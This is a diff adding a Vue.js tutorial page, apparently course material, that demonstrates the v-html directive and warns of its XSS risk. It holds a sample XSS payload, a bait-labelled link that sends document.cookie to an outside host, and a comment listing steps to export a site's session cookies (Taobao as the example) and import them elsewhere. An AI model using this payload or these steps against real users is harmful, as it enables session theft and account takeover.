@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="./js/vue.js"></script>
+    <title>1.内置指令</title>
+    <style>
+
+    </style>
+</head>
+
+<body>
+    <!-- 
+    v-html指令：
+            1.作用：向指定节点中渲染包含html结构的内容。
+            2.与插值语法的区别：
+                        (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+                        (2).v-html可以识别html结构。
+            3.严重注意：v-html有安全性问题！！！！
+                        (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+                        (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+		-->
+
+    <div id="root">
+        <h2>{{msg}}</h2>
+        <h3 v-html="cs"></h3>
+
+    </div>
+
+    <script>
+        /*  1.下载cookie-Editor 扩展
+             https://huajiakeji.com/productivity/2020-09/3643/download.html
+         2.获取用户当前页面的cookie(例如：淘宝网) （控制台——》Application->Cookies）
+         3.利用插件复制Export当前页面cookie
+         4.打开本地浏览器，进入（淘宝网），利用插件import 获取的Cookies */
+
+
+        //生产环境提示关闭
+        Vue.config.productionTip = false;
+
+        new Vue({
+            //指定容器
+            el: '#root',
+            //数据绑定
+            data: {
+                msg: '你好明天',
+                cs: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>是兄弟就来砍我啊</a>'
+            },
+
+        })
+
+
+    </script>
+</body>
+
+</html>
